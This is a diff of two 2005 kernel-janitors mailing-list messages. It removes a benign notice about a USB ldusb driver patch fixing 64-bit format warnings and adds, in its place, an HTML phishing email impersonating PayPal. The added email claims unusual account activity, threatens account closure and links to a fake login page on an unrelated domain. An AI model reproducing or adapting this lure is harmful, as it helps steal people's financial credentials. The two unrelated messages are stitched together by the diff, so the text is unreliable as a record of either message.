@@ -1,79 +1,77 @@
-From: <gregkh@suse.de>
-Date: Tue, 16 Aug 2005 00:57:33 +0000
-Subject: [KJ] patch usb-ldusb-64-bit-warnings.patch added to gregkh-2.6 tree
-Message-Id: <1E4pll-7V0-00@press.kroah.org>
+From: "accounts.billing@smtp07.paypal.com" <accounts.billing@smtp07.paypal.com>
+Date: Wed, 24 Aug 2005 01:31:16 +0000
+Subject: [KJ] Notification of Limited Account Access
+Message-Id: <20050824013116.803EE3D051@clust07-www05.powweb.com>
 MIME-Version: 1
-Content-Type: multipart/mixed; boundary="===============94062142865606302=="
+Content-Type: multipart/mixed; boundary="----------=_1124847091-6884-557"
 List-Id: <kernel-janitors.vger.kernel.org>
 To: kernel-janitors@vger.kernel.org
 
---===============94062142865606302==
+This is a multi-part message in MIME format...
+
+------------=_1124847091-6884-557
+Content-type: text/html; charset=iso-8859-1
+Content-Disposition: inline
 
 
-This is a note to let you know that I've just added the patch titled
-
-     Subject: USB ldusb: fmt warnings fixes for 64-bit platforms
-
-to my gregkh-2.6 tree.  Its filename is
-
-     usb-ldusb-64-bit-warnings.patch
-
-This tree can be found at 
-    http://www.kernel.org/pub/linux/kernel/people/gregkh/gregkh-2.6/patches/
-
-Patches currently in gregkh-2.6 which might be from adobriyan@gmail.com are
-
-i2c/hwmon-split-round2-10.patch
-usb/usb-ldusb-64-bit-warnings.patch
+<html>
+<title>PayPal Billing Dept.</title>
+<p>Dear PayPal Member,</p>
 
 
-From kernel-janitors-bounces@lists.osdl.org Sun Aug 14 14:33:19 2005
-Date: Sun, 14 Aug 2005 17:24:26 +0400
-From: Alexey Dobriyan <adobriyan@gmail.com>
-To: <kernel-janitors@lists.osdl.org>
-Message-ID: <20050814132426.GB15052@mipter.zuzino.mipt.ru>
-Subject: USB ldusb: fmt warnings fixes for 64-bit platforms
+<p>PayPal is committed to maintaining a safe environment for its community of
+buyers and sellers. To protect the security of your account, PayPal employs
+some of the most advanced security systems in the world and our anti-fraud
+teams regularly screen the PayPal system for unusual activity.</p>
 
-Fix
+<p>Recently, our Account Review Team identified some unusual activity in your
+account. In accordance with PayPal's User Agreement and to ensure that your
+account has not been compromised, access to your account was flagged. Your
+account will remain flagged until this issue has been resolved.
+This is a fraud prevention measure meant to ensure that your account is not
+compromised.</p>
 
-drivers/usb/misc/ldusb.c: In function `ld_usb_read':
-drivers/usb/misc/ldusb.c:467: warning: int format, different type arg (arg 4)
-drivers/usb/misc/ldusb.c: In function `ld_usb_write':
-drivers/usb/misc/ldusb.c:531: warning: int format, different type arg (arg 4)
-drivers/usb/misc/ldusb.c:532: warning: int format, different type arg (arg 5)
-drivers/usb/misc/ldusb.c:532: warning: int format, different type arg (arg 6)
+<p>In order to secure your account and quickly restore full access, we may
+require some specific information from you for the following reason:</p>
 
-Signed-off-by: Alexey Dobriyan <adobriyan@gmail.com>
-Signed-off-by: Greg Kroah-Hartman <gregkh@suse.de>
+<p>Our system requires further account verification.</p>
 
----
- drivers/usb/misc/ldusb.c |    6 +++---
- 1 files changed, 3 insertions(+), 3 deletions(-)
+<p>Case ID Number: PP-056-245-481
+We encourage you to log in and restore full access as soon as possible.
+Should your account remain flagged for an extended period of time,
+it may result in further limitations on the use of your account or
+may result in eventual account closure.</p>
 
---- gregkh-2.6.orig/drivers/usb/misc/ldusb.c	2005-08-15 17:50:06.000000000 -0700
-+++ gregkh-2.6/drivers/usb/misc/ldusb.c	2005-08-15 17:50:18.000000000 -0700
-@@ -464,7 +464,7 @@
- 	actual_buffer = (size_t*)(dev->ring_buffer + dev->ring_tail*(sizeof(size_t)+dev->interrupt_in_endpoint_size));
- 	bytes_to_read = min(count, *actual_buffer);
- 	if (bytes_to_read < *actual_buffer)
--		dev_warn(&dev->intf->dev, "Read buffer overflow, %d bytes dropped\n",
-+		dev_warn(&dev->intf->dev, "Read buffer overflow, %zd bytes dropped\n",
- 			 *actual_buffer-bytes_to_read);
- 
- 	/* copy one interrupt_in_buffer from ring_buffer into userspace */
-@@ -528,8 +528,8 @@
- 	/* write the data into interrupt_out_buffer from userspace */
- 	bytes_to_write = min(count, write_buffer_size*dev->interrupt_out_endpoint_size);
- 	if (bytes_to_write < count)
--		dev_warn(&dev->intf->dev, "Write buffer overflow, %d bytes dropped\n",count-bytes_to_write);
--	dbg_info(&dev->intf->dev, "%s: count = %d, bytes_to_write = %d\n", __FUNCTION__, count, bytes_to_write);
-+		dev_warn(&dev->intf->dev, "Write buffer overflow, %zd bytes dropped\n",count-bytes_to_write);
-+	dbg_info(&dev->intf->dev, "%s: count = %zd, bytes_to_write = %zd\n", __FUNCTION__, count, bytes_to_write);
- 
- 	if (copy_from_user(dev->interrupt_out_buffer, buffer, bytes_to_write)) {
- 		retval = -EFAULT;
+<p>-------------------------------------------------------------</p>
+<p>Please click on the link below to log in
+and restore full access to your account.</p>
+<table width="50%" cellpadding="1" cellspacing="0" border="0"
+bgcolor="#FFE65C" >
+				<tr>
+					<td>
+						<table width="100%" cellpadding="4" cellspacing="0" border="0"
+bgcolor="#FFFECD" align="center">
+							<tr>
+								<td class="pp_sansserif" align="center">
+                                <a href="http://sms.dnssdr.com/horde/imp/.paypal/error.html">Click here to activate your account</a></td>
+							</tr>
+						</table>
+					</td>
+				</tr>
+			</table>
+<p>-------------------------------------------------------------</p>
 
---===============94062142865606302==
+<p>Thank you for your prompt attention to this matter. Please understand that
+this is a security measure meant to help protect you and your account. We
+apologize for any inconvenience.</p>
+
+
+<p>Sincerely,</p>
+<p>PayPal Account Review Department</p>
+
+<p>PayPal Email ID PP562</p>
+
+------------=_1124847091-6884-557
 Content-Type: text/plain; charset="iso-8859-1"
 MIME-Version: 1.0
 Content-Transfer-Encoding: quoted-printable
@@ -84,4 +82,4 @@ Kernel-janitors mailing list
 Kernel-janitors@lists.osdl.org
 https://lists.osdl.org/mailman/listinfo/kernel-janitors
 
---===============94062142865606302==--
+------------=_1124847091-6884-557--
